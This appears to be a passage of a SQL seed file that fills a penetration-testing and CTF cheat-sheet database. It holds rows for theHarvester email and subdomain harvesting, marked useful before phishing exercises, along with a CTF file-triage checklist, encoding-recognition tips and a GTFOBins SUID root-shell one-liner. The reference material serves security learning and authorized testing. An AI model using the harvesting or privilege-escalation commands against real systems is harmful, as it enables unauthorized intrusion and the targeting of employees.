 E'theHarvester -d <domain> -l 500 -b google,bing,linkedin,hunter',
 'Gathers emails, subdomains, IPs, and employee names from public sources.',
 'osint','harvesting',
 ARRAY['theharvester','emails','subdomains','osint','recon'], ARRAY['linux','macos'], 'beginner',
 'T1589','Gather Victim Identity Information',
 'Great for finding employee emails before phishing exercises. LinkedIn source often most useful.',
 'offensive'),

-- CTF
('CTF  First steps checklist on any challenge file',
 E'file <file>              # 1. True file type\nstrings <file>           # 2. Printable strings\nexiftool <file>          # 3. Metadata\nbinwalk -e <file>        # 4. Embedded files\nxxd <file> | head -20    # 5. Hex header',
 'Standard first-five-commands methodology for any unknown file in CTF forensics/misc challenges.',
 'ctf','methodology',
 ARRAY['ctf','methodology','forensics','file-analysis','checklist'], ARRAY['linux','macos'], 'beginner',
 NULL, NULL,
 'Run all five before doing anything else. You will be surprised what you find. Do not skip.',
 'both'),
('CTF  Common encoding recognition patterns',
 E'# Base64:    A-Za-z0-9+/= (ends with =)\n# Base32:    A-Z2-7= (uppercase only)\n# Hex:        0-9a-f (even length)\n# ROT13:      readable letters, shifted\n# Morse:      dots and dashes\n# Binary:     only 0 and 1\n# Bacon:      A and B sequences\n# Atbash:     reversed alphabet',
 'Quick reference for visually identifying common encoding schemes in CTF challenges.',
 'ctf','encoding',
 ARRAY['ctf','encoding','base64','hex','rot13','morse','recognition'], ARRAY['any'], 'beginner',
 NULL, NULL,
 'If it has = at the end → try base64 first. If only 0-9a-f → try hex decode.',
 'both'),
('GTFOBins  Quick lookup for privesc via SUID binary',
 E'# Website: https://gtfobins.github.io\n# Usage: find the binary name → Filter: SUID\n# Example for find:\nfind . -exec /bin/sh -p \\; -quit',
 'GTFOBins documents how to abuse Unix binaries for privilege escalation, reverse shells, and file reads.',
 'ctf','privesc',
 ARRAY['gtfobins','suid','privesc','lpe','linux','ctf'], ARRAY['linux'], 'beginner',
 'T1548.001','Setuid and Setgid',
 'Bookmark this. Every CTF and OSCP machine needs it. Ctrl+F the binary name on the site.',
 'offensive')

ON CONFLICT DO NOTHING;
